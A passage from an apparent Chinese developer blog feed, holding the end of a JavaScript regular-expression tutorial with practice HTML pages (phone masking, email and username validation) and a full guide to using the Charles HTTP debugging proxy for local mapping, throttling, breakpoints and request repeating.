class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>正则练习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"1-找首尾相同的单词"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"2-手机号第4位到第七位换成*"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"3-统一空格"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"4-把名字中的,去掉"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"5-把aaabb换成ab"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">           <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b([\w])[\w]*\1\b/g</span>;<span class="comment">// \1注意引用方式 [\w]任意一个 [\w]*任意多个 找首尾相同的单词</span></span></span><br><span class="line"><span class="undefined">            /**</span></span><br><span class="line"><span class="undefined">             *  *如何引用子表达式所匹配的结果？</span></span><br><span class="line"><span class="undefined">             *</span></span><br><span class="line"><span class="undefined">             * 答： 在表达式内部 反向引用时 \n来匹配第N个子表达式的结果 子表达式当成变量来传递时，$N来匹配第N个子表达式的匹配结果</span></span><br><span class="line"><span class="undefined">             * </span></span><br><span class="line"><span class="undefined">             */</span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/(1(3|5|8|)\d)\d&#123;4&#125;(\d&#123;4&#125;)/</span>;<span class="comment">//字表达式(3|5|8|)  (\d&#123;4&#125;)  &#123;4&#125;代表任意4个  </span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// alert(cv.match(reg));//打印结果18878553070，188，3070</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'$1****$3'</span>));<span class="comment">//188****4070</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/[ \t\u3000]+/g</span>;<span class="comment">//找空白符  第一个是半角的空格  \s包含所有空白符  \u3000表示 全角空格的16进制Unicode编码</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">','</span>));<span class="comment">//</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/([\u4E00-\u9FA0]),([\u4E00-\u9FA0])/g</span>;  <span class="comment">// 找中文用Unicode编码表的中文范围</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">','</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="comment">//;  </span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">','</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-8-例8-常用正则"><a href="#4-8-例8-常用正则" class="headerlink" title="4.8 例8-常用正则"></a>4.8 例8-常用正则</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/GxzNoG" target="_blank" rel="noopener">https://codepen.io/poetries/pen/GxzNoG</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>常用正则解答<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/(\w)\1+/g</span>; <span class="comment">//查找连续多个字符  把aaabbccdd换成abcd这个格式</span></span></span><br><span class="line"><span class="undefined">            /**\1 后向引用，表示表达式中，从左往右数，第一个左括号对应的括号内的内容。</span></span><br><span class="line"><span class="undefined">            以此类推，\2表示第二个，\0表示整个表达式**/</span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'$1'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//手机号正则：</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//1开头</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//358第二位</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//后九位</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/1[358]\d&#123;9&#125;/g</span>; <span class="comment">// 这种情况适合在一段文本中分析出手机号</span></span></span><br><span class="line"><span class="javascript">            alert(cv.match(reg));<span class="comment">//分析手机号</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^1[358]\d&#123;9&#125;$/g</span>;</span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">// test 验证手机号</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^\s+|\s+$/g</span>; <span class="comment">// | 并列 或者 去除两端空格</span></span></span><br><span class="line"><span class="javascript">            alert(<span class="string">'--'</span>+cv.replace(reg,<span class="string">''</span>)+<span class="string">'--'</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//借助正则限制在一个有限范围内 防止sql注入</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^[\w\u4E00-\u9FA0]&#123;4,16&#125;$/</span>; <span class="comment">// \u4E00-\u9FA0 中文对应的Unicode编码 验证由字母数字下划线中文组合的4-16位用户名 </span></span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t6</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^[0-9a-zA-Z]\w*(\.[\w]+)*@[0-9a-zA-Z\-]+(\.[\w]+)+$/</span>;</span></span><br><span class="line"><span class="undefined">            alert(reg.test(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t7</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="comment">//;</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">''</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"1-替换相同字符串"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"2-分析出手机号"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"3-验证手机号"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"4-去除两端空格"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"5-验证由字母数字下划线中文组合的4-16位用户名"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"6-验证邮箱"</span> <span class="attr">onclick</span>=<span class="string">"t6();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"7-清空script代码"</span> <span class="attr">onclick</span>=<span class="string">"t7();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/JavaScript%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.gif" alt=""></p><h2 id="六、扩展阅读"><a href="#六、扩展阅读" class="headerlink" title="六、扩展阅读"></a>六、扩展阅读</h2><ul><li><a href="http://blog.poetries.top/2016/07/09/%E6%A2%B3%E7%90%86%E5%B8%B8%E7%94%A8%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">梳理常用的正则表达式</a></li><li><a href="http://blog.poetries.top/handbook/">一些总结</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;h3 id=&quot;1-1-正则表达式的web常见场合&quot;&gt;&lt;a href=&quot;#1-1-正则表达式的web常见场合&quot; class=&quot;he
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
      <category term="正则表达式" scheme="http://blog.poetries.top/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Mac下抓包工具Charles的使用</title>
    <link href="http://blog.poetries.top/2018/03/22/Charles/"/>
    <id>http://blog.poetries.top/2018/03/22/Charles/</id>
    <published>2018-03-22T02:09:43.000Z</published>
    <updated>2018-04-10T03:33:13.967Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源于互联网</p></blockquote><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><blockquote><p><code>Charles</code>是目前最强大的<code>http</code>调试工具，在界面和功能上远强于<code>Fiddler</code></p></blockquote><h3 id="1-1-界面功能"><a href="#1-1-界面功能" class="headerlink" title="1.1 界面功能"></a>1.1 界面功能</h3><p><img src="http://upload-images.jianshu.io/upload_images/1480597-dcb11f65d7bb29fc..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>工具条包含了<code>Charles</code>的大部分功能</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-14cca0970bd19068..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>右键请求出现菜单，Charles的右键菜单功能比fiddler强大太多了</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-99c41c766077fde6..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li>双击请求进入列表视图，类似fiddler，方便查看和过滤请求</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-d9d6a4fefc75bb73..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>请求详情跟fiddler相似，但直观不少</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-010c9113091479cf..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>工具视图基本讲解完毕，接下来我们用Charles做点事情</p></blockquote><h2 id="二、本地代理和远程代理"><a href="#二、本地代理和远程代理" class="headerlink" title="二、本地代理和远程代理"></a>二、本地代理和远程代理</h2><blockquote><p><code>Charles</code>的代理服务器端口跟<code>fiddler</code>一样都是<code>8888</code>，即你的本机<code>ip:8888</code></p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-15460772ca290ea1..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li>点击“Map Local”后：</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-3be697ffcf5ae7ad..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><img src="http://upload-images.jianshu.io/upload_images/1480597-fe78305b4936f75a..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>index-min.js代理成index.js，刷新页面试试。</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-c4874188758f7543..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li><code>Charles</code>的树状视图比<code>fiddler</code>的列表视图好的地方在于，多次刷新后的请求会被归纳到树里面，更加一目了然，用<code>fiddler</code>的时候，有点强迫症的同学，都要点击<code>clear</code></li><li><code>Charles</code>是支持子目录代理哦，非常实用的功能：(使用通配符<code>*</code>)</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-9755c00d0f287627..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>本地地址选择个子目录，不需要通配符</p></blockquote><p><strong>如何判断是否代理成功呢?</strong></p><ul><li>这点<code>Charles</code>比<code>fiddler</code>人性化多了</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-66b46b491915731d..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>校验是否代理成功，最省力的方式是点击工具条上的刷新按钮，刷新单个请求，如果代理成功，<code>Charles</code>会往“<code>Notes</code>”界面打个<code>log</code>，比如<code>Mapped to local file: C:\www\htdocs\gallery\uploader\1.5\build\index-min.js</code></p></blockquote><p><strong>去除代理配置</strong></p><blockquote><p>小技巧：所有的配置开关都可以通过工具条上的“工具”设置(倒数第二个按钮)</p></blockquote><ul><li>去掉代理配置：</li></ul><blockquote><p>小技巧：建议开启No Caching，不缓存请求</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-5e357738bd0a1a64..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="三、mobile代理功能"><a href="#三、mobile代理功能" class="headerlink" title="三、mobile代理功能"></a>三、mobile代理功能</h2><ul><li>手机或平板页面的调试，我们需要把请求代理到<code>pc</code>端的<code>Charles</code>上</li><li>必须确保<code>mobile</code>端和<code>pc</code>端连的是相同的无线网络</li><li>终端获取<code>IP</code> <code>ifconfig</code></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/465386-a00f5967a22675c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt=""></p><h2 id="四、网速模拟功能"><a href="#四、网速模拟功能" class="headerlink" title="四、网速模拟功能"></a>四、网速模拟功能</h2><ul><li><code>throttle</code>功能对于前端来说非常实用，可以看页面在低网速下的表现，从而找出优化的点</li><li>首先先配置下<code>throttle</code></li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-11db08e44b8884aa..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><blockquote><p>我们要看页面在3G环境下的表现</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-ac0c7bb62d00b172..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li><code>Bandwidth</code>(带宽)</li><li><code>Utilistation</code>(利用百分比)</li><li><code>Round-trip</code>(往返延迟)</li><li><code>MTU</code>(字节)</li></ul><h2 id="五、断点功能"><a href="#五、断点功能" class="headerlink" title="五、断点功能"></a>五、断点功能</h2><blockquote><p><code>Charles</code>另一个非常实用的功能，对于开发者和测试人员来说，堪称神器。<code>Charles</code>能够断到发送请求前(篡改<code>Request</code>)和请求后(篡改<code>Response</code>)。</p></blockquote><ul><li>场景：<code>ajax</code>发送请求，我们需要测试接口的各种边界情况，比如出错、超时等表现，<code>Charles</code>的断点+随意篡改，非常方便测试</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-6c39ea05332e991b..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li><code>upload.php</code>是我们要测试的上传接口，右键选择“<code>BreakPoints</code>”，开启断点</li><li>小技巧：不用在<code>web</code>界面中操作，使用<code>repeat</code>功能，就可再次发送一样的请求：</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-4fb23edb106e60ff..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="六、重复发送请求"><a href="#六、重复发送请求" class="headerlink" title="六、重复发送请求"></a>六、重复发送请求</h2><ul><li><code>repeat</code>功能对于测试同学特别有用，可以检验接口的健壮性。</li><li><code>repeat</code>功对于前端的价值是不需要刷新页面，只需要<code>repeat</code>请求，比如检验代理是否成功，修改请求后执行等</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-10932f6745751e3b..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><ul><li>“<code>repeat</code>”重复发送一次请求。</li><li>“<code>repeat Advances</code>”可以自定义重复次数和重复间隔</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/1480597-1d2c4f4d9e08ea40..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="七、过滤请求"><a href="#七、过滤请求" class="headerlink" title="七、过滤请求"></a>七、过滤请求</h2><blockquote><p>捕获的请求太多，容易产生干扰，<code>Charles</code>可以对捕获记录进行过滤。</p></blockquote><p><img src="http://upload-images.jianshu.io/upload_images/1480597-64bab3a21fafb2b2..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><img src="http://upload-images.jianshu.io/upload_images/1480597-69831aefa91efa5a..png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><strong>相关文章阅读</strong></p><ul><li><a href="http://blog.poetries.top/2017/11/04/fiddler/">windows下使用Fiddler做抓包分析</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;来源于互联网&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Ch
      
    
    </summary>
    
      <category term="Tools" scheme="http://blog.poetries.top/categories/Tools/"/>
    
    
      <category term="调试" scheme="http://blog.poetries.top/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="Charles" scheme="http://blog.poetries.top/tags/Charles/"/>
    
  </entry>
  
  <entry>
    <title>nginx之location的匹配规则</title>
    <link href="http://blog.poetries.top/2018/02/28/nginx-location-match-rules/"/>
    <id>http://blog.poetries.top/2018/02/28/nginx-location-match-rules/</id>
    <published>2018-02-28T05:01:42.000Z</published>
    <updated>2018-04-10T03:33:13.991Z</updated>
    
